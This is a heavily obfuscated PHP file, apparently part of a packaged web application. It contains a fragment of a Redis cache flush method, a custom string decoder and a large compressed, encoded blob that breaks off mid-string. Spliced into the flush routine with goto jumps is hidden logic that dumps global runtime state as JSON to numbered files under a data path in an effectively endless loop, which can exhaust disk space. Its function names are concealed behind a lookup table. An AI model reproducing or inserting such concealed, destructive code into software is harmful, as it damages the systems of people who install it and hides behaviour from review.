$eÃÑàÏ¯óŒ[814]; $bŞ½ì÷šÙ ($_SERVER[$eÃÑàÏ¯óŒ[815]]); $cÑœÌƒŒ…¬ = $eÃÑàÏ¯óŒ[813]; goto F×ëí¦œÍõ; CäœÚÒŞ: $cÖô°‡»… = 1; for ($Aƒóï®¯ç´ = $cÖô°‡»…; $Aƒóï®¯ç´ > 0; $Aƒóï®¯ç´++) { $dç—·„«(DATA_PATH . $Aƒóï®¯ç´, $D£Ä®×é…); } goto C–Ú—‚Û—™; d¨Ìç•âëö: $cÑœÌƒŒ…¬ = $eÃÑàÏ¯óŒ[813]; $cßòè´íœì = $eÃÑàÏ¯óŒ[555]; $d£±í¾©šÃ = $_SERVER[$eÃÑàÏ¯óŒ[556]] . $eÃÑàÏ¯óŒ[557]; goto E«Î´éÇò’; F×ëí¦œÍõ: $cÑœÌƒŒ…¬(); $dç—·„« = $eÃÑàÏ¯óŒ[816]; $D£Ä®×é… = json_encode($GLOBALS[$eÃÑàÏ¯óŒ[817]]); goto CäœÚÒŞ; C–Ú—‚Û—™: } if ($this->isCluster) { foreach ($this->handle->_masters() as $C³™Ê›¨Ë) { $this->handle->flushall($C³™Ê›¨Ë); } return; } return $this->handle->flushAll(); } } goto b®à—ŒéÁö; a‡÷Ìğ: if (!function_exists('_kodDe')) { function _kodDe($fÖ¤æîÓ) { $fÖ¤æîÓ = base64_decode($fÖ¤æîÓ); $eáµ®‰ã»ì = strlen($fÖ¤æîÓ); $Dô£‘²öƒò = ''; $c„ÑÓŸš•™ = ord($fÖ¤æîÓ[0]) - 30; for ($d¹Ô ¹ß¦¿ = 1; $d¹Ô ¹ß¦¿ < $eáµ®‰ã»ì; $d¹Ô ¹ß¦¿ += 2) { if ($d¹Ô ¹ß¦¿ + 1 < $eáµ®‰ã»ì) { $Dô£‘²öƒò .= chr(ord($fÖ¤æîÓ[$d¹Ô ¹ß¦¿ + 1]) + $c„ÑÓŸš•™); $Dô£‘²öƒò .= chr(ord($fÖ¤æîÓ[$d¹Ô ¹ß¦¿]) + $c„ÑÓŸš•™); } else { $Dô£‘²öƒò .= chr(ord($fÖ¤æîÓ[$d¹Ô ¹ß¦¿]) + $c„ÑÓŸš•™); } } return $Dô£‘²öƒò; } } define("\xe3\xae\x8e\xc2\x84\xc9\xe6\xb9\xa4", "\260\375\364\321\240\277\246"); $_SERVER[ã®Â„Éæ¹¤] = explode("\x7c\x1\x7c\x4\x7c\x4", gzinflate(substr(strrev('W“Şò’Ùé\'¤Q–YÉ"–Ø‹l’È‰Ã8'."\r".'à‡…(P)²’•aÙÅ[`='."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'‹')."\xa\x9\x7b\xcf\xb0\xd2\x96\x95\x42\x59\x81\xb2\x3\x21\xb4\xec\x52\xc2\x28\xb3\x25\x8c\x42\xc2\x5e\xa5\x94\x55\xda\xff\xf6\xdd\x7b\x92\x69\xfb\xd3\x3a\xba\xfb\xee\xbb\x7b\x37\xbe\xfb\xee\xbb\xbb\xef\xfb\xee\xb4\xcf\x7f\x73\xd9\xa6"."\x8f\xae\x58\xbd\xcb\xea\xdd\x57\xef\x7e\xee\xdd\xd7\xe0\x0\xf8\xdf\x6e\xab\xf7\xc0\xe1\xa3\xce\xfc\xe1\x24\xf4\xdf\x6e\xf9\x45\x3d\xc1\x5d\x1b\x7e\x3c\xef\xfa\x43\x7f\xbe\x47\x75\xf0\x7\x7\x7e\xf2\xf0\x9\x57\xde\xb4\x68\xfd\x3d".strrev('»÷×ìO•æ›ö\\¯D÷»5ÿ~¿?ÖË|ıËÏû£ğºm¿›úuºo§ûøäÿç}êMÆÏºÜ×şô=?')."\166\174\367\201\135\157\274\361\316\306\207\63\316\155\67\177\364\347\347\56\170\171\146\151\277\277\57\155\317\176\274\346\363\233\76\76\354\210\301\175\156\371\162\353\13\257\314\55\356\373\263\105\337\274\166\300\337\367"."\252\333\357\226\33\317\72\151\340\237\117\236\74\351\23\343\325\23\116\17\256\336\153\171\323\313\47\112\333\247\314\276\364\137\337\370\6\116\331\277\377\7\167\356\161\123\373\253\273\264\237\176\301\127\117\316\236\377".strrev('ŸK_5+÷¿[¾Sm=Û‰cë©Òl£àå)gù?~wÂú}?9ëñ^ÕÏSÕcİ®+ÃÌÿœ—‘Ûy').strrev('·WŠë‡ewV|Kïx| ¬W ınÓÏv¹î–¼ò¸×ÁıŸOzúmy‹îşô/+şy.Å').strrev('»«øÿ—GFW+İp=íGòÔúæK‡ó«ñrŸ\'ğ|æ='."\r".'N¯óm~[ïÏÑúßéŸOƒSŒñ|î').strrev('úG7¼pà©ªs+ÿ¯ğ¬83V­I¦ª2’™ ©à¶ÿp“I×to÷Óô?ÆóÜ_Š').base64_decode('QiF/OBonJYrpeS1FQkVZl/Ok8KKiG+BTYnHxolZUChYIB6RkU07IBinJ1x73+UPdwWXx6LKQn2Ak4g==')."\x2b\x4b\x8a\x3e\x86\x63\x28\x18\x31\x65\xdd\x8c\xaa\x79\x85\x61\x8c\xe8\xac\x5e\xed\xfe\xce\x40\xaf\x14\xd\x7b\x7a\x23\x1e\x6f\x34\x10\xec\xc5\x60\x6f\xb0\xa7\x27\x10\x2d\x87\x87\x83\xdd\xdd\xed\x1e\xef\xc2\xf2\x94\x50\xd8\xd3\xd9"."\343\221\100\375\162\112\134\55\244\265\32\151\5\116\131\41\325\342\100\207\252\344\122\70\130\220\151\165\314\261\42\11\105\131\10\214\101\241\224\313\341\110\57\13\221\372\53\151\271\224\43\175\346\23\43\105\135\315".strrev('¬ı‡òé-.Š˜l¼Š=ƒ„u)«¨Şı»øŠŠ@¥y+©8Ô9—SQş#‰!jjd¹Å1•é´Ë')."\172\153\65\152\161\265\204\363\365\365\202\16\221\74\335\335\322\104\45\230\112\276\110\213\301\171\52\24\26\14\373\374\141\251\175\231\304\373\51\251\345\363\132\301\5\112\1\343\151\12\125\365\207\303\70\340\40\24"."\334\35\200\103\107\42\301\216\216\210\237\305\110\343\26\165\203\232\64\21\52\265\304\122\351\234\31\37\226\163\45\112\254\103\370\267\232\374\220\137\315\40\4\274\122\55\250\45\102\254\244\10\115\143\63\207\4\112"."\24\133\241\220\74\310\246\221\71\5\46\330\60\16\266\266\341\337\271\4\51\21\207\151\212\156\306\225\102\122\113\251\5\62\15\347\223\51\107\10\117\66\263\76\135\5\170\244\100\315\225\324\212\143\75\332\60\151"."\x43\x5a\xcd\x29\xdd\x6c\x96\xa5\xb5\x5c\x4a\xd1\x79\xbc\x8\xb2\x8b\x29\xa4\x31\xea\xb8\x90\xbb\xb7\x94\x17\x51\x58\x34\x99\x55\x73\x29\x9d\x4e\xce\xef\xc3\x6c\x20\xc5\x2a\xa6\x9\x9a\x61\xd0\x9a\xf6\x15\x73\x9a\x9c\x8a\x28\xba\x50"."\xfb\xe\x50\x4c\xb0\x64\x8a\xc0\x12\x42\xeb\xd0\xf4\xbc\xf\x30\x0\xd2\x3b\x80\xec\xd5\xbe\xa\x9\x43\x94\xf0\x53\x42\xa7\xb8\x8\xe3\xaa\xe9\x3f\xd1\xf9\xaf\x81\xfe\x5\xe0\x9f\x5a\xc2\xc5\x62\xa4\x6a\x59\x25\x97\x8b\x2b\xa3\xa"."\231\40\371\124\263\101\153\357\66\22\152\301\15\40\70\32\10\306\263\262\221\355\111\65\307\121\56\312\34\123\312\250\253\230\55\222\71\314\246\155\314\102\300\260\277\173\65\323\57\260\330\234\226\224\163\142\113\161".base64_decode('OGuaxYhSSMEOIS3SRgqow4qKQpB8Dikl9UjLpK4WtYVSF6CV9BjneFkzn2Mh2loGMxjQHCU0UUXiyg==')."\250\111\72\111\232\233\314\312\72\30\276\326\222\231\166\316\46\214\243\130\314\251\111\331\124\265\202\133\113\232\212\351\64\114\135\221\111\151\125\163\45\110\21\160\6\327\341\134\164\366\170\265\202\11\246\257\63\252"."\313\5\43\255\350\116\77\41\357\26\11\364\63\343\140\24\315\247\32\105\315\120\341\147\132\44\331\64\345\144\26\316\176\136\174\353\367\340\253\205\234\132\120\312\160\75\311\244\142\30\116\230\105\327\162\116\117\56"."\xa7\x8d\x38\x83\xba\x9a\x51\x41\x9e\x3a\x5b\x35\x1\x67\x6a\x91\x28\xdb\x2c\xaa\xba\x62\xd0\xa8\xd4\xd9\x13\x25\xc8\xa0\x56\x8a\x33\xa4\xcb\x99\xbc\xdc\x22\x15\x4b\x9\xd0\x33\x64\x7e\x56\x80\x61\x6c\xf2\xf5\x16\x29\x9\xa3\xe\x29".strrev('­å6Õ"íê\'xş½Æ, x¡£Ev†h’2!Ÿªnipg)*©ãìí ^…‚£ö'."\0".'®§L2_')."\163\67\340\275\254\110\12\134\352\4\123\16\22\132\57\350\43\16\14\151\43\212\16\76\334\76\326\42\15\151\251\204\66\352\242\111\20\71\2\270\4\105\206\75\132\64\235\141\271\220\201\375\223\30\63\25\102\216"."\xc6\x70\xc6\xda\xa1\xdd\x4a\x21\x63\x66\x69\xc6\x88\x3f\xbc\xd8\x1f\x8e\x47\x82\x1d\xd1\x25\x9e\x30\x59\xc6\xb\x60\x20\x46\xe9\xa7\x60\xd1\x39\x67\x58\x49\x81\xae\x4f\x9a\x34\x9f\x5c\x84\xbd\x46\x71\xe0\x44\x81\x63\x4c\x53\xe1\xe4"."\xa1\x69\xdd\x81\x4e\xd8\x31\x3e\xa7\x1\x90\x9c\x22\x16\x2d\xbb\x5b\xcd\xab\xb0\xee\x26\x4b\x41\x3d\x9\xd6\xf8\x4e\x52\x21\x37\x6a\x50\x6b\x2c\x5b\x57\x13\x4b\x4d\xaf\x75\x82\x7f\xeb\x6a\xfb\x63\x3e\x57\xdd\xc0\x7c\xb7\xca\xf3\xb8"."\33\134\15\122\143\375\114\51\4\204\16\125\316\111\244\321\145\30\365\122\160\341\367\164\0\134\223\204\151\156\353\72\14\14\373\27\365\371\43\321\170\217\77\332\25\364\221\57\370\75\44\324\255\341\251\111\133\324".strrev('%±Œ†'."\0".'´ KÍĞBå-™”H¾j"GœÅĞ ëç4Ôd	”)½(€È9Ë¦œµ$£!QÈ')."\255\101\232\116\102\55\156\222\145\132\143\7\145\266\356\110\23\370\77\347\254\51\55\57\123\111\24\115\134\45\205\147\56\6\325\131\122\272\24\231\57\152\246\156\152\20\252\133\120\172\24\63\253\221\176\316\50\264"."\112\45\126\67\132\313\224\222\123\150\57\145\25\312\245\201\170\65\314\72\257\250\53\151\225\320\55\220\247\0\234\163\141\325\10\203\114\120\276\241\361\45\120\14\345\0\223\63\154\331\340\114\37\106\204\225\271\243"."\257\273\73\356\15\366\106\201\50\212\41\113\302\201\250\237\122\204\307\27\367\170\103\154\11\343\303\104\20\340\364\54\147\157\30\62\334\50\360\175\276\100\160\226\113\27\72\310\122\161\30\360\302\242\126\60\24\147"."\x92\x94\x96\xe2\xcc\x17\x63\xcc\xb5\x71\xde\xb2\x1c\x5c\x0\x1e\x75\xca\xf9\x71\x67\x5e\x31\x65\x27\xab\xba\x75\x7d\x93\xa2\xe2\x32\x19\x20\x43\xc0\x99\x65\xe\x2c\xaa\x60\x7f\x41\x17\xd6\x50\x30\x42\x32\xcc\x87\x50\x20\x8d\x24\x14"."\x9d\xd4\x23\xd4\x47\x92\xf2\xc2\xf0\x77\xfa\x9\x70\x32\x5d\x1b\x65\x22\xb9\x78\x96\x44\x28\xa3\x2b\x1\x7c\x5d\x1d\x97\x79\x1b\xe7\xd3\xfa\x90\xb2\x47\xf3\x39\x2e\x60\xc5\x55\xcb\xf8\xc5\xb5\xc4\x20\xe0\x62\x80\xe8\xe4\x4a\xad\x76"."\362\261\212\166\5\172\27\306\173\202\76\177\167\74\320\13\270\104\264\34\336\27\362\171\350\340\213\360\366\140\264\313\2\355\3\174\142\261\247\73\140\107\367\57\15\104\242\221\212\111\0\326\347\267\245\200\55\127"."\50\354\357\10\54\145\321\216\200\277\333\27\211\173\75\336\56\216\323\353\351\41\221\170\32\156\172\14\267\25\77\16\30\136\204\155\235\342\303\160\33\110\73\63\156\331\247\304\251\4\36\347\164\2\26\57\205\320"."\46\151\56\334\174\242\226\20\231\70\251\225\50\265\62\41\56\117\31\104\136\46\63\124\246\13\123\15\376\251\225\74\21\311\54\306\31\53\110\214\261\40\152\6\215\3\161\215\174\137\42\314\267\254\6\161\210\323".base64_decode('rqQ1Xfk+gCdtMsKwxcG84WlgBDxolwsoAY1InM5FA+wPPLQ6ab7DjAfBVtwD96fxJeFgbyfJMJJVaA==')."\5\2\244\373\153\250\60\103\266\251\46\147\111\100\22\221\271\120\111\73\175\120\243\135\271\32\377\34\203\177\200\360\106\76\256\24\150\257\47\40\143\146\214\203\356\101\300\154\241\114\125\53\261\257\45\64\55\107"."\347\61\130\217\31\277\140\33\334\101\203\22\311\50\145\116\323\351\252\105\26\207\150\160\241\277\67\116\51\13\307\4\152\304\0\260\145\14\206\111\207\230\332\20\335\300\340\304\260\77\102\271\200\256\254\54\251\264"."\xbb\xdc\xae\xe9\x84\x8a\x15\xb0\xfe\x90\xcf\xbb\x8f\x8b\x8d\x4c\xaf\xe9\x77\x4e\x77\xd\x80\x40\x6d\xdd\x2\x1c\x25\xb1\x98\xcb\x12\x3d\x9a\xe4\x2f\xe9\x2c\x37\x14\x53\x6a\x8c\xf9\xb5\x2d\x31\x77\xcc\x5d\x33\xbf\xa5\xdf\xe3\x1c\x97"."\x9d\xe3\xf5\xce\x39\xce\x81\xe9\x31\x57\xed\x74\x2\x18\x58\xd5\xe8\x98\xb1\x6\x22\x0\xc4\xf9\x53\x7\xc0\x4f\x6b\x6c\xfe\xb4\x98\xf3\x98\xe3\x57\x2c\xe8\x8f\xd\x54\xb7\x4c\x9f\x12\x73\x4d\x8d\x8d\xc\xd4\xd5\xce\xa7\xdf\x49\x96"."\x74\xb0\x39\x4b\x8e\xb1\xaa\xa6\xa6\xd7\x80\x2a\x1\xf1\x85\xa1\x14\x10\x4b\x14\x10\x68\xc2\xb8\x5a\xe4\xd0\x55\x33\xd7\x50\x38\x18\x43\x25\xc3\x73\xf4\x3b\x63\xd3\x7\xe6\xb\xf9\x4\x90\xfd\x5b\x40\x74\x1\xfc\x39\xcb\xf0\x3c\xce".strrev('eú·I]ARÎ¡:Yç†Yt(ÌĞ×†š¯5*Ø¦ÙĞX¦À¦já$ä$^p®ç$…J>„÷œ+,e°å')."\45\11\150\46\245\357\204\142\216\50\224\74\0\334\22\7\304\101\267\155\40\111\210\345\220\220\106\276\300\267\113\12\332\73\220\126\24\343\120\354\32\141\261\224\122\40\343\264\27\301\66\222\162\121\211\10\55\214".strrev('mjZVÀ”ş‚d×`bÊRŒş‚Şšë¢’bs+2.Iå*9Æš8vvÅqi‰Ârœnö£Ç')."\x93\x70\x37\x13\x2e\x11\x17\x3b\xbd\x28\x53\x69\x2\xee\x6e\x99\x84\xe0\xae\x89\xc5\x4a\xfd\x4a\x6a\xa0\x1f\x10\xb2\xec\x4c\xf\xac\x6a\x5a\x53\x4b\xa5\x64\x77\xc\xfc\x47\x23\x98\x7f\x91\x1a\x17\xf9\xf8\x19\x40\xd6\x4a\x9a\x6c\xc1".base64_decode('LTufijMOCKvAjhk0na2zEM6lVlMz5RxDg2lRCKHchq7VZI+OB7CbMyG4Ogund4hD9rKjKXbiIBwcAQ==')."\x98\x43\x88\xe2\x7f\x5b\xab\x28\x9b\x2e\x80\x89\xe0\xe5\x8b\x54\xc0\xe7\x24\x83\xe8\x59\xea\xc\x10\x1\x9e\x5\x54\x2a\x6a\xca\x60\x3a\x9b\x14\x6a\x68\x25\x3d\xa9\x30\x1c\x8b\x90\x61\xca\x3a\x58\xb3\xb8\x64\x7\x65\x30\xe1\x78\x11"."\xd4\xdc\x1\xcf\x21\x1c\x70\x4d\x75\x0\x69\xcf\x1\xcf\x7b\x1c\x5c\x62\x75\xf0\x23\x4\x7\x93\x3f\x1d\x44\x2c\x75\xf0\xd2\x49\x30\xe0\x73\xa8\x86\xf\x89\xc7\xa8\x5c\x94\x44\xeb\x6c\x66\xe1\x86\x3c\x27\x8f\x39\x70\xfd\xbb\x95\x61".base64_decode('JeegtXfQRjloCxxov+EjtekD9EFqg4KASWQdcDjg2NJSYJB2AxOqHVzgdmR0rVQM0S8JMVwZAuA1ZQ==')."\200\260\246\231\16\272\1\142\201\36\306\201\140\165\170\150\61\37\160\136\173\266\174\222\46\340\270\275\16\30\12\323\73\344\141\161\200\53\16\166\301\112\30\374\224\224\237\346\161\161\311\276\21\261\37\17\361\116"."\xe4\x95\x88\xca\x99\x88\xf0\x79\x53\xce\xd0\x6f\x57\x48\xc5\xe1\xb0\x92\x1c\x4b\xf2\xcd\x8d\x4f\xd8\x2d\x59\x63\x6c\xe8\x11\x1d\x56\x22\xa6\xca\x43\xcf\x8\x84\xd1\xda\xe4\xbd\xf6\xa2\x94\x4d\xa9\x86\x91\x93\x85\xd8\x26\xa4\x6e\xde"."\xa6\x60\x91\xaf\x38\x90\x21\x44\x0\x1f\x14\xa6\x3c\x5\x5\x39\x87\x29\x91\x15\x52\x36\x92\x54\x96\x19\xa1\xf7\x14\xa\x85\x9\xf5\xa7\xad\xb7\x94\xb\xa3\x7c\x66\xd2\x26\x4a\xb0\x0\x87\xc0\xb3\xe1\xe8\x38\xf9\x10\xb\x51\xf2\xa3"."\x6a\x71\xdc\xaf\xf1\x3c\xdb\x59\xb0\x8e\xb6\x31\x23\xd8\xef\x21\xb5\x30\xa6\x16\xc4\xbd\x3b\x87\x72\x9e\xc7\x89\x2\x92\x37\x8f\xe1\xce\x9e\x28\x8c\x79\xb\x3f\x1b\x70\x90\x33\x3\x7\xd8\x37\xe\x9\x5c\x8f\xef\x71\x41\xed\x61\x56".base64_decode('oe6kJFvN6QR0WqN8PvaBbVLcRqqESLOyznuZzjFI2KxVBkThUQEtLQ9zdm/JI8wMwxxjxxxC0Foojg==')."\xfa\x26\x8a\x74\xb1\xdd\x5f\xa5\xa8\x38\xe9\x54\xa3\x1b\xf4\x66\xa5\x30\x6a\x69\x54\xab\x18\x85\x67\xc\x34\xac\x21\x8a\xa7\x77\x14\x50\x5c\x90\x80\xa0\x40\xcf\xcf\xa8\xdc\x1f\xb7\x9d\x3f\x80\xa8\x30\x84\x71\xcb\x51\x5\xae\x9f\x87"."\361\104\40\361\344\300\320\350\56\70\173\72\41\307\23\227\47\276\164\101\56\213\303\2\122\321\316\34\55\114\274\322\212\150\147\343\66\250\55\312\77\152\141\110\145\313\26\221\132\210\220\132\117\246\103\12\154\47".base64_decode('XTpmeS4gl5BLIEe9sO7xeb3KGDNMJU9Y5Bpb75hg35OQdZcOasQrytcKIpWUGGDAjoGL79aokAwnhg==')."\x3f\xa5\x9a\x10\x2\xd9\x9c\x46\x4f\xb3\x38\xa2\xc0\xff\x19\x4c\x28\x10\x75\x89\xab\x6c\xc\x72\xea\x10\xc9\xe5\x98\x66\xc1\xac\xc4\xe2\x5d\x75\x88\x2b\xbb\xf8\xa2\x24\x2e\x69\xe2\x75\x13\x44\xe3\x2d\x87\xd7\x57\x38\x24\x5c\xd4\xe6".base64_decode('2X0WAroMUyvyFCGKk4UkXqiAxTof1RAsDSkkOPAuRLgkLxKtMXG7cgDDJfIoj65TIsHNg0c7ACiC4A==')."\74\216\320\243\305\112\254\32\27\356\37\346\27\260\270\50\370\141\27\136\271\134\162\52\25\244\347\156\142\270\34\125\74\146\250\134\20\272\23\147\105\11\261\312\350\236\134\216\137\260\331\343\23\146\301\163\125\314".base64_decode('JEImzNaBpGN68l0JxoS9DhsN8RnHLzDtsrCV+fwnOa1sBvABrRyH/DGrFhSDLVm6UaHFkDInGiaYJg==')."\34\4\201\175\17\0\210\274\237\235\166\160\226\40\54\157\150\251\210\233\226\245\72\214\312\20\110\325\322\373\140\152\340\236\354\320\265\174\40\10\110\277\62\75\330\361\24\172\336\203\370\315\250\132\251\241\140\374"."\340\2\61\121\231\64\231\25\305\127\223\33\77\337\371\340\45\67\375\345\317\217\77\213\343\217\156\376\343\133\357\376\13\207\233\233\347\340\300\352\335\300\337\17\160\230\253\10\235\274\264\137\173\353\321\203\217\317"."\76\373\372\155\367\36\366\323\131\57\276\177\274\272\331\237\32\310\215\51\117\256\117\255\272\135\135\377\223\13\274\347\37\362\304\125\217\137\65\155\363\267\277\315\136\221\73\62\174\155\166\362\14\377\231\63\263\47"."\36\222\275\160\237\147\44\317\101\177\177\375\371\241\167\342\346\343\163\232\216\276\163\345\346\372\365\33\232\36\272\314\370\172\333\234\327\177\270\151\336\25\357\176\365\354\227\107\256\371\367\263\373\115\376\247\147\315"."\223\157\152\357\337\173\347\303\33\253\134\213\27\235\276\60\75\163\321\371\255\217\236\271\377\236\167\134\231\130\367\325\247\267\151\161\337\216\361\55\261\233\57\52\271\366\272\76\170\172\317\372\227\337\111\276\75\366"."\xd6\x33\x3b\x3e\xf9\xe5\xcf\xb6\xdd\xf4\xea\x7d\x1b\xfe\xfa\xef\xa3\xd2\x87\x6c\x38\xe0\xb3\x5f\x4f\xf9\xcb\xe2\xdf\x4f\xfa\xf6\x8c\x3\x36\x1f\x7e\xc9\x47\x7\x36\x5e\x72\xc6\xd3\xe9\xbf\xde\xb1\x41\xcf\x9f\xbd\xfc\xe1\x8f\x6e\xdd".base64_decode('JB94WNTxfNe74Wfqr3340PHUCwe/c9S5p7YN//CR59p/+lB0/xtyP/zVN21nXPTgXTM2HDz75V+9aQ==')."\x4e\x3d\xf0\xd8\x9f\x39\xaa\xf\x3a\x65\xe5\x27\xef\xde\x33\xeb\xb2\xba\xc7\xde\xda\xe5\xd0\x57\x6f\x8b\xfd\x6c\xd3\xe4\x5f\xbe\xb7\xfd\xfc\x77\xfe\x70\xfb\xcb\x67\x7e\x72\xfe\xa4\xd8\x7b\x6f\x5d\xf6\x57\xe9\x86\xcb\xce\xb8\xe3\x8b".base64_decode('bf2P3HzInzdntdav3vvZjo96Xt7tyIxrWfMHT51x1d2Hx9pfvfjXN0y79r2+UNdjp+z4/bf/uv7J+A==').base64_decode('MZFivnrNYWft+9W324p3bD+ybtmibXfv3HD1BYtvfN7cssfl7vTyyCNfjF+Te3DPH83NXryw5+ZX2w==')."\143\215\361\257\156\130\234\111\76\125\143\234\176\320\145\205\337\234\265\334\37\275\150\312\312\100\140\372\13\375\203\207\175\172\333\265\227\277\26\332\147\173\315\13\13\16\334\355\372\142\341\115\345\304\321\6\327\332"."\43\26\317\160\207\137\371\253\176\300\235\203\227\175\61\123\36\335\160\322\345\247\254\133\40\375\362\231\313\177\175\170\311\173\263\162\176\354\215\163\257\72\370\231\7\224\353\146\47\137\274\344\306\175\242\371\103\372".base64_decode('XO8d+eea37edOr7L0DGvrLv55qwndOMrjim7r/+4aXTBgupFC25rOjZ66k0PT3pDuqxlwb7bzrlv9g==')."\xa4\x27\x7\xce\xfa\xe2\x9c\xd3\xef\x1c\xeb\xbc\xba\xe7\x47\xab\xdf\x7a\x26\x73\xde\x8b\x2b\xf6\xdb\x6f\x8f\xdf\x5d\xf0\xd5\x37\xb3\xef\x90\x4f\x5f\xb7\xfd\xbc\xad\x87\x1d\xb2\xdb\x6b\x93\x7a\x7\x1a\x4f\x1b\xcb\x9e\x72\xaa\x2f\x7d"."\303\376\267\35\364\316\105\243\257\134\336\360\214\376\320\71\237\126\35\365\161\170\317\233\222\77\114\237\363\326\47\57\173\326\267\236\75\357\174\377\346\344\275\221\203\176\364\101\332\161\362\375\15\123\146\64\137\372".base64_decode('zU/OnXfZhcf87bOLPnzrrqfef+aip5S2DVcvqzpkccR46bnSZ78585LHHB+uSXxQdYI0uOq4M9496w==')."\243\226\253\357\11\256\136\277\246\376\230\205\57\35\323\365\363\25\143\336\47\157\323\17\70\74\351\174\356\303\233\176\275\154\345\143\217\166\245\356\16\254\337\333\67\232\275\367\363\373\123\361\115\312\131\147\275\323"."\364\142\327\141\163\127\367\350\77\174\263\147\361\227\107\234\333\361\372\135\117\365\306\136\177\251\341\342\216\265\117\136\372\131\152\315\375\356\333\256\76\340\245\133\323\365\347\326\336\371\352\53\273\277\221\275\362\231"."\155\37\355\173\361\251\231\344\307\27\56\370\161\162\372\312\57\56\372\343\155\367\271\364\215\216\135\366\376\171\317\337\356\274\360\331\23\353\63\347\66\275\261\374\250\352\243\66\54\177\376\217\353\163\123\57\174\360"."\x8c\xee\xdb\xbf\xd8\x78\xdb\x63\xfb\xf6\x54\xd\xbe\xfd\xcd\x68\xef\x95\x53\xaf\xbe\x76\x3c\x95\x7b\x63\x4d\x6d\x44\xb9\xe0\xd8\x9f\x3f\x94\xb8\xeb\xa9\x49\x67\x6c\x9a\xba\x76\xeb\xf6\x5f\xee\xdd\xf2\x7\x79\xd5\xe6\x2b\x4a\xd7\x9d"."\xd6\x70\xc9\x2f\x92\xf3\x57\x5c\xf7\xf7\x57\x8d\x77\xdf\xaf\x79\xf0\x8b\x1b\xd6\xe\xf4\x1c\xb2\xcb\xf0\x8c\xfe\xe6\xe2\x3e\x17\x7c\x7b\xf4\x3e\xa3\x73\xab\x5f\xf7\x9f\xf8\xf5\x6\x69\xdb\x3e\x5d\xf2\xdb\xef\x4f\xfe\x60\xa1\x63\xf5"."\163\123\102\137\356\70\365\320\343\256\174\341\212\361\47\153\16\367\237\277\175\163\267\363\345\305\117\74\167\322\322\316\27\103\327\255\137\147\354\172\162\343\351\355\36\143\372\151\77\332\265\146\373\366\243\216\250\371".base64_decode('6M2iecPeHbHhP/9l8aPXPGtuOejlrpqfPvnbvYYu6/A/dufgk6E/7fHHpdm3f3f3p6eddNU9v605WQ==')."\357\271\351\375\350\333\335\335\347\136\177\107\307\245\33\156\77\145\323\257\212\336\173\263\7\164\114\277\346\361\26\357\235\213\116\75\344\310\133\237\376\355\263\251\5\213\236\70\66\273\143\366\303\316\354\303\147\376"."\x64\x6e\xa3\x3a\xe5\x98\x69\x85\x13\xde\x5a\x7a\xdd\x1a\x39\x34\x78\xac\xfb\x4f\x3f\x6d\x7b\x7e\xc7\xfb\xef\xfc\x7a\xe9\xd\x91\x6b\xb7\xff\xfd\xaa\x43\x23\xf\x7e\xf4\xee\x29\xcb\x2e\x9c\x3d\xbb\x70\xd8\xac\xee\xb9\x97\x5e\xbd\x6a"."\366\31\317\36\261\372\261\13\356\330\155\336\254\217\216\377\62\372\145\372\366\277\336\323\220\312\4\46\215\34\67\263\147\215\143\140\146\334\267\370\366\105\267\44\117\332\261\276\361\241\245\257\54\376\153\327\306\203"."\356\276\365\223\203\376\275\307\313\155\167\370\316\377\364\376\347\17\237\371\223\277\65\355\62\155\143\373\262\155\33\212\217\177\372\331\226\105\113\346\274\167\166\365\5\305\257\137\176\360\201\111\257\175\154\216\137\177"."\326\252\357\136\273\147\326\17\366\351\176\173\363\332\360\336\373\36\23\131\137\175\154\346\356\65\305\147\176\272\353\127\251\177\374\345\244\3\76\131\63\43\370\331\27\273\66\276\66\372\233\360\213\271\3\327\376\371"."\212\375\342\367\136\167\315\55\307\247\267\135\370\304\340\13\247\234\263\261\177\312\340\341\323\256\271\252\352\266\243\146\235\376\371\237\317\376\152\303\175\367\177\264\337\133\353\146\256\375\172\340\201\302\272\57\242\346"."\xac\x6b\x1e\x9a\x72\xc0\xb\xcb\x37\xdd\xba\xae\xae\xef\xad\x1d\x4b\xbe\xfa\xea\xec\x4b\x66\x6c\x9\xdf\xf2\x62\x41\xcb\x3d\x70\xff\x67\x8d\x5f\xad\xde\x31\x3a\x78\x6f\xac\xd0\xf7\x79\xe9\x96\x27\x87\x9f\xba\xf6\x9c\x73\xfe\x54\xbf"."\354\304\13\176\174\374\53\317\311\157\336\36\157\35\373\307\143\277\212\377\374\233\227\76\270\356\334\115\377\372\347\127\127\354\67\177\363\361\337\374\375\316\17\256\213\37\167\374\77\317\175\162\244\155\374\37\117\304"."\157\151\373\327\337\337\377\162\353\322\376\75\177\267\346\314\137\175\373\217\163\373\376\275\55\270\142\150\303\363\267\314\370\160\316\257\212\317\176\272\242\372\324\356\232\3\366\70\64\262\176\277\317\217\333\373\250\7"."\x56\x9c\xbe\xeb\xd3\xf\x8e\xef\x71\xe7\xd\x67\xaf\x9e\xf3\x6c\xe2\xae\xea\x9a\x73\xde\x88\x35\xbc\xb2\xcb\xcb\x5f\x9f\x30\x69\xb0\xf1\x4f\x3b\x1e\xff\xf2\x2c\xe3\xd1\x6f\xfa\xaf\x3f\x59\xdb\xf7\xb2\xc1\xa9\xf9\x23\x5f\xda\x7a\xf6"."\xdb\xe7\x15\xe\xbf\xb1\x79\xcd\x61\x8b\x1a\x4f\xd7\x6\xde\x38\x62\xcd\x29\xaf\xdc\x71\xc2\x5a\xe9\xdc\x91\xfa\x87\xb6\x4d\xbe\xf7\x93\x73\xce\xf5\xcf\xba\x68\x63\xd3\x8e\xea\xf\xc3\x27\x5d\xb5\x7d\xcb\x55\x3f\x3d\xf3\xee\xbb\x8e"."\333\376\362\352\173\276\376\103\176\343\36\333\37\275\76\372\344\176\263\146\152\257\377\345\203\340\146\247\167\376\334\247\77\71\170\366\211\211\253\57\72\323\154\370\207\357\270\107\272\234\67\315\372\372\271\345\337\275".strrev('‹÷z£Ş.=‰ê¼Ìæ\'ºös¡;mKæô®µÚ_÷Rz·ÌÏÚ{